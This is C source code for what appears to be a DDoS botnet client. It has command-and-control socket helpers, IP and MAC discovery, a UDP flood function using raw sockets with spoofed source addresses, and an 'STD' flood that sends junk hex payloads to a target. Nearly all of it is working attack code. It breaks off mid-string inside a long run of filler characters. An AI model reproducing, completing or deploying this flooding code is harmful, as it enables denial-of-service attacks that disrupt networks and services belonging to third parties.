#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <poll.h>
#include <net/if.h>
#include <ctype.h>
#include <dirent.h>
#include <sys/resource.h>
#include <stdlib.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <limits.h>
#include <stdio.h>
#include <poll.h>
#include <sys/un.h>
#include <stddef.h>
#include <sys/resource.h>
#define NUMITEMS(x)  (sizeof(x) / sizeof((x)[0]))
#define SERVER_LIST_SIZE (sizeof(agagag) / sizeof(unsigned char *))
#define PR_SET_NAME 15
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define CMD_IAC 255
#define CMD_WILL 251
#define CMD_WONT 252
#define CMD_DO 253
#define CMD_DONT 254
#define OPT_SGA 3
#define BUFFER_SIZE 1024
#define PHI 0x9e3779b9
#define SOCKBUF_SIZE 1024
#define PRINT_BUF_LEN 12
#define std_packet 8190
#define STD2_SIZE 8191
#define std_packets 1240

int initConnection();
void makeRandomStr(unsigned char *buf, int length);
int sockprintf(int sock, char *formatStr, ...);
char *inet_ntoa(struct in_addr in);
int mainCommSock = 0, currentServer = -1, gotIP = 0;
uint32_t *pids;
uint64_t numpids = 0;
struct in_addr ourIP;
#define PHI 0x9e3779b9
static uint32_t Q[4096], c = 362436;
unsigned char macAddress[6] = {0};
uint16_t checksum_tcp_udp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
{
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;
    int length = len;
    
    while (len > 1)
    {
        sum += *buf;
        buf++;
        len -= 2;
    }

    if (len == 1)
        sum += *((uint8_t *) buf);

    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += htons(iph->protocol);
    sum += data_len;

    while (sum >> 16) 
        sum = (sum & 0xFFFF) + (sum >> 16);

    return ((uint16_t) (~sum));
}
void init_rand(uint32_t x)
{
        int i;

        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;

        for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
uint32_t rand_cmwc(void)
{
        uint64_t t, a = 18782LL;
        static uint32_t i = 4095;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (uint32_t)(t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}
in_addr_t findRandIP(in_addr_t netmask){
    in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
    return tmp ^ ( rand_cmwc() & ~netmask);
}
in_addr_t getRandomIP(in_addr_t netmask) {
        in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
        return tmp ^ ( rand_cmwc() & ~netmask);
}
unsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd)
{
    int got = 1, total = 0;
    while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
    return got == 0 ? NULL : buffer;
}
int getOurIP()
{
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock == -1) return 0;

    struct sockaddr_in serv;
    memset(&serv, 0, sizeof(serv));
    serv.sin_family = AF_INET;
    serv.sin_addr.s_addr = inet_addr("8.8.8.8");
    serv.sin_port = htons(53);

    int err = connect(sock, (const struct sockaddr*) &serv, sizeof(serv));
    if(err == -1) return 0;

    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    err = getsockname(sock, (struct sockaddr*) &name, &namelen);
    if(err == -1) return 0;

    ourIP.s_addr = name.sin_addr.s_addr;
    int cmdline = open("/proc/net/route", O_RDONLY);
    char linebuf[4096];
    while(fdgets(linebuf, 4096, cmdline) != NULL)
    {
        if(strstr(linebuf, "\t00000000\t") != NULL)
        {
            unsigned char *pos = linebuf;
            while(*pos != '\t') pos++;
            *pos = 0;
            break;
        }
        memset(linebuf, 0, 4096);
    }
    close(cmdline);

    if(*linebuf)
    {
        int i;
        struct ifreq ifr;
        strcpy(ifr.ifr_name, linebuf);
        ioctl(sock, SIOCGIFHWADDR, &ifr);
        for (i=0; i<6; i++) macAddress[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
    }

    close(sock);
}
int util_strlen(char *str) {
    int c = 0;

    while (*str++ != 0)
        c++;
    return c;
}
int util_stristr(char *haystack, int haystack_len, char *str) {
    char *ptr = haystack;
    int str_len = util_strlen(str);
    int match_count = 0;

    while (haystack_len-- > 0)
    {
        char a = *ptr++;
        char b = str[match_count];
        a = a >= 'A' && a <= 'Z' ? a | 0x60 : a;
        b = b >= 'A' && b <= 'Z' ? b | 0x60 : b;

        if (a == b)
        {
            if (++match_count == str_len)
                return (ptr - haystack);
        }
        else
            match_count = 0;
    }

    return -1;
}

void util_memcpy(void *dst, void *src, int len) {
    char *r_dst = (char *)dst;
    char *r_src = (char *)src;
    while (len--)
        *r_dst++ = *r_src++;
}

int util_strcpy(char *dst, char *src) {
    int l = util_strlen(src);

    util_memcpy(dst, src, l + 1);

    return l;
}

void util_zero(void *buf, int len)
{
    char *zero = buf;
    while (len--)
        *zero++ = 0;
}
char *util_fdgets(char *buffer, int buffer_size, int fd)
{
    int got = 0, total = 0;
    do 
    {
        got = read(fd, buffer + total, 1);
        total = got == 1 ? total + 1 : total;
    }
    while (got == 1 && total < buffer_size && *(buffer + (total - 1)) != '\n');

    return total == 0 ? NULL : buffer;
}

int util_isdigit(char c)
{
    return (c >= '0' && c <= '9');
}
int util_isalpha(char c)
{
    return ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'));
}

int util_isspace(char c)
{
    return (c == ' ' || c == '\t' || c == '\n' || c == '\12');
}
int util_isupper(char c)
{
    return (c >= 'A' && c <= 'Z');
}

int util_atoi(char *str, int base)
{
    unsigned long acc = 0;
    int c;
    unsigned long cutoff;
    int neg = 0, any, cutlim;

    do {
        c = *str++;
    } while (util_isspace(c));
    if (c == '-') {
        neg = 1;
        c = *str++;
    } else if (c == '+')
        c = *str++;

    cutoff = neg ? -(unsigned long)LONG_MIN : LONG_MAX;
    cutlim = cutoff % (unsigned long)base;
    cutoff /= (unsigned long)base;
    for (acc = 0, any = 0;; c = *str++) {
        if (util_isdigit(c))
            c -= '0';
        else if (util_isalpha(c))
            c -= util_isupper(c) ? 'A' - 10 : 'a' - 10;
        else
            break;
            
        if (c >= base)
            break;

        if (any < 0 || acc > cutoff || acc == cutoff && c > cutlim)
            any = -1;
        else {
            any = 1;
            acc *= base;
            acc += c;
        }
    }
    if (any < 0) {
        acc = neg ? LONG_MIN : LONG_MAX;
    } else if (neg)
        acc = -acc;
    return (acc);
}
char *util_itoa(int value, int radix, char *string)
{
    if (string == NULL)
        return NULL;

    if (value != 0)
    {
        char scratch[34];
        int neg;
        int offset;
        int c;
        unsigned int accum;

        offset = 32;
        scratch[33] = 0;

        if (radix == 10 && value < 0)
        {
            neg = 1;
            accum = -value;
        }
        else
        {
            neg = 0;
            accum = (unsigned int)value;
        }

        while (accum)
        {
            c = accum % radix;
            if (c < 10)
                c += '0';
            else
                c += 'A' - 10;

            scratch[offset] = c;
            accum /= radix;
            offset--;
        }
        
        if (neg)
            scratch[offset] = '-';
        else
            offset++;

        util_strcpy(string, &scratch[offset]);
    }
    else
    {
        string[0] = '0';
        string[1] = 0;
    }

    return string;
}
int util_strcmp(char *str1, char *str2)
{
    int l1 = util_strlen(str1), l2 = util_strlen(str2);

    if (l1 != l2)
        return 0;

    while (l1--)
    {
        if (*str1++ != *str2++)
            return 0;
    }

    return 1;
}
int util_memsearch(char *buf, int buf_len, char *mem, int mem_len)
{
    int i, matched = 0;

    if (mem_len > buf_len)
        return -1;

    for (i = 0; i < buf_len; i++)
    {
        if (buf[i] == mem[matched])
        {
            if (++matched == mem_len)
                return i + 1;
        }
        else
            matched = 0;
    }

    return -1;
}
void trim(char *str)
{
        int i;
        int begin = 0;
        int end = strlen(str) - 1;

        while (isspace(str[begin])) begin++;

        while ((end >= begin) && isspace(str[end])) end--;
        for (i = begin; i <= end; i++) str[i - begin] = str[i];

        str[i - begin] = '\0';
}

static void printchar(unsigned char **str, int c)
{
        if (str) {
                **str = c;
                ++(*str);
        }
        else (void)write(1, &c, 1);
}

static int prints(unsigned char **out, const unsigned char *string, int width, int pad)
{
        register int pc = 0, padchar = ' ';

        if (width > 0) {
                register int len = 0;
                register const unsigned char *ptr;
                for (ptr = string; *ptr; ++ptr) ++len;
                if (len >= width) width = 0;
                else width -= len;
                if (pad & PAD_ZERO) padchar = '0';
        }
        if (!(pad & PAD_RIGHT)) {
                for ( ; width > 0; --width) {
                        printchar (out, padchar);
                        ++pc;
                }
        }
        for ( ; *string ; ++string) {
                printchar (out, *string);
                ++pc;
        }
        for ( ; width > 0; --width) {
                printchar (out, padchar);
                ++pc;
        }

        return pc;
}

static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase)
{
        unsigned char print_buf[PRINT_BUF_LEN];
        register unsigned char *s;
        register int t, neg = 0, pc = 0;
        register unsigned int u = i;

        if (i == 0) {
                print_buf[0] = '0';
                print_buf[1] = '\0';
                return prints (out, print_buf, width, pad);
        }

        if (sg && b == 10 && i < 0) {
                neg = 1;
                u = -i;
        }

        s = print_buf + PRINT_BUF_LEN-1;
        *s = '\0';

        while (u) {
                t = u % b;
                if( t >= 10 )
                t += letbase - '0' - 10;
                *--s = t + '0';
                u /= b;
        }

        if (neg) {
                if( width && (pad & PAD_ZERO) ) {
                        printchar (out, '-');
                        ++pc;
                        --width;
                }
                else {
                        *--s = '-';
                }
        }

        return pc + prints (out, s, width, pad);
}

static int print(unsigned char **out, const unsigned char *format, va_list args )
{
        register int width, pad;
        register int pc = 0;
        unsigned char scr[2];

        for (; *format != 0; ++format) {
                if (*format == '%') {
                        ++format;
                        width = pad = 0;
                        if (*format == '\0') break;
                        if (*format == '%') goto out;
                        if (*format == '-') {
                                ++format;
                                pad = PAD_RIGHT;
                        }
                        while (*format == '0') {
                                ++format;
                                pad |= PAD_ZERO;
                        }
                        for ( ; *format >= '0' && *format <= '9'; ++format) {
                                width *= 10;
                                width += *format - '0';
                        }
                        if( *format == 's' ) {
                                register char *s = (char *)va_arg( args, int );
                                pc += prints (out, s?s:"(null)", width, pad);
                                continue;
                        }
                        if( *format == 'd' ) {
                                pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'x' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'X' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
                                continue;
                        }
                        if( *format == 'u' ) {
                                pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'c' ) {
                                scr[0] = (unsigned char)va_arg( args, int );
                                scr[1] = '\0';
                                pc += prints (out, scr, width, pad);
                                continue;
                        }
                }
                else {
out:
                        printchar (out, *format);
                        ++pc;
                }
        }
        if (out) **out = '\0';
        va_end( args );
        return pc;
}
int sockprintf(int sock, char *formatStr, ...)
{
        unsigned char *textBuffer = malloc(2048);
        memset(textBuffer, 0, 2048);
        char *orig = textBuffer;
        va_list args;
        va_start(args, formatStr);
        print(&textBuffer, formatStr, args);
        va_end(args);
        orig[strlen(orig)] = '\n';
        int q = send(sock,orig,strlen(orig), MSG_NOSIGNAL);
        free(orig);
        return q;
}

int getHost(unsigned char *toGet, struct in_addr *i)
{
        struct hostent *h;
        if((i->s_addr = inet_addr(toGet)) == -1) return 1;
        return 0;
}

void makeRandomStr(unsigned char *buf, int length)
{
        int i = 0;
        for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}

int recvLine(int socket, unsigned char *buf, int bufsize)
{
        memset(buf, 0, bufsize);
        fd_set myset;
        struct timeval tv;
        tv.tv_sec = 30;
        tv.tv_usec = 0;
        FD_ZERO(&myset);
        FD_SET(socket, &myset);
        int selectRtn, retryCount;
        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                while(retryCount < 10)
                {
                        tv.tv_sec = 30;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(socket, &myset);
                        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                                retryCount++;
                                continue;
                        }
                        break;
                }
        }
        unsigned char tmpchr;
        unsigned char *cp;
        int count = 0;
        cp = buf;
        while(bufsize-- > 1)
        {
                if(recv(mainCommSock, &tmpchr, 1, 0) != 1) {
                        *cp = 0x00;
                        return -1;
                }
                *cp++ = tmpchr;
                if(tmpchr == '\n') break;
                count++;
        }
        *cp = 0x00;
        return count;
}

int connectTimeout(int fd, char *host, int port, int timeout)
{
        struct sockaddr_in dest_addr;
        fd_set myset;
        struct timeval tv;
        socklen_t lon;

        int valopt;
        long arg = fcntl(fd, F_GETFL, NULL);
        arg |= O_NONBLOCK;
        fcntl(fd, F_SETFL, arg);

        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(port);
        if(getHost(host, &dest_addr.sin_addr)) return 0;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        if (res < 0) {
                if (errno == EINPROGRESS) {
                        tv.tv_sec = timeout;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(fd, &myset);
                        if (select(fd+1, NULL, &myset, NULL, &tv) > 0) {
                                lon = sizeof(int);
                                getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                                if (valopt) return 0;
                        }
                        else return 0;
                }
                else return 0;
        }

        arg = fcntl(fd, F_GETFL, NULL);
        arg &= (~O_NONBLOCK);
        fcntl(fd, F_SETFL, arg);

        return 1;
}

int listFork()
{
        uint32_t parent, *newpids, i;
        parent = fork();
        if (parent <= 0) return parent;
        numpids++;
        newpids = (uint32_t*)malloc((numpids + 1) * 4);
        for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
        newpids[numpids - 1] = parent;
        free(pids);
        pids = newpids;
        return parent;
}

unsigned short csum (unsigned short *buf, int count)
{
        register uint64_t sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (uint16_t)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
{

        struct tcp_pseudo
        {
                unsigned long src_addr;
                unsigned long dst_addr;
                unsigned char zero;
                unsigned char proto;
                unsigned short length;
        } pseudohead;
        unsigned short total_len = iph->tot_len;
        pseudohead.src_addr=iph->saddr;
        pseudohead.dst_addr=iph->daddr;
        pseudohead.zero=0;
        pseudohead.proto=IPPROTO_TCP;
        pseudohead.length=htons(sizeof(struct tcphdr));
        int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
        unsigned short *tcp = malloc(totaltcp_len);
        memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
        memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
        unsigned short output = csum(tcp,totaltcp_len);
        free(tcp);
        return output;
}

void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}
void k2o_BB2(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime){
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    register unsigned int pollRegister;
    pollRegister = pollinterval;
    if(spoofit == 32){
        int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(!sockfd){
            return;
        }
        unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
        if(buf == NULL) return;
        memset(buf, 0, packetsize + 1);
        makeRandomStr(buf, packetsize);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            if(i == pollRegister){
                if(port == 0) dest_addr.sin_port = rand_cmwc();
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
    else{
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if(!sockfd){
            return;
        }
        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0){
            return;
        }
        int counter = 50;
        while(counter--){
            srand(time(NULL) ^ rand_cmwc());
            init_rand(rand());
        }
        in_addr_t netmask;
        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );
        unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( findRandIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
        udph->len = htons(sizeof(struct udphdr) + packetsize);
        udph->source = rand_cmwc();
        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
        udph->check = 0;
        makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            udph->source = rand_cmwc();
            udph->dest = (port == 0 ? rand_cmwc() : htons(port));
            iph->id = rand_cmwc();
            iph->saddr = htonl( findRandIP(netmask) );
            iph->check = csum ((unsigned short *) packet, iph->tot_len);
            if(i == pollRegister){
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
}
void sendSTD(unsigned char *ip, int port, int secs){
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    int rport;
    unsigned char *hexstring = malloc(1024);
    memset(hexstring, 0, 1024);
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1){
        char * randstrings[] = {
        "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A",
        "\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA"
        "\x0D\x1E\x1F\x12\x06\x62\x26\x12\x62\x0D\x12\x01\x06\x0D\x1C\x01\x32\x12\x6C\x63\x1B\x32\x6C\x63\x3C\x32\x62\x63\x6C\x26\x12\x1C\x12\x6C\x63\x62\x06\x12\x21\x2D\x32\x62\x11\x2D\x21\x32\x62\x10\x12\x01\x0D\x12\x30\x21\x2D\x30\x13\x1C\x1E\x10\x01\x10\x3E\x3C\x32\x37\x01\x0D\x10\x12\x12\x30\x2D\x62\x10\x12\x1E\x10\x0D\x12\x1E\x1C\x10\x12\x0D\x01\x10\x12\x1E\x1C\x30\x21\x2D\x32\x30\x2D\x30\x2D\x21\x30\x21\x2D\x3E\x13\x0D\x32\x20\x33\x62\x63\x12\x21\x2D\x3D\x36\x12\x62\x30\x61\x11\x10\x06\x00\x17\x22\x63\x2D\x02\x01\x6C\x6D\x36\x6C\x0D\x02\x16\x6D\x63\x12\x02\x61\x17\x63\x20\x22\x6C\x2D\x02\x63\x6D\x37\x22\x63\x6D\x00\x02\x2D\x22\x63\x6D\x17\x22\x2D\x21\x22\x63\x00\x30\x32\x60\x30\x00\x17\x22\x36\x36\x6D\x01\x6C\x0D\x12\x02\x61\x20\x62\x63\x17\x10\x62\x6C\x61\x2C\x37\x22\x63\x17\x0D\x01\x3D\x22\x63\x6C\x17\x01\x2D\x37\x63\x62\x00\x37\x17\x6D\x63\x62\x37\x3C\x54",
        "\x6D\x21\x65\x66\x67\x60\x60\x6C\x21\x65\x66\x60\x35\x2AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA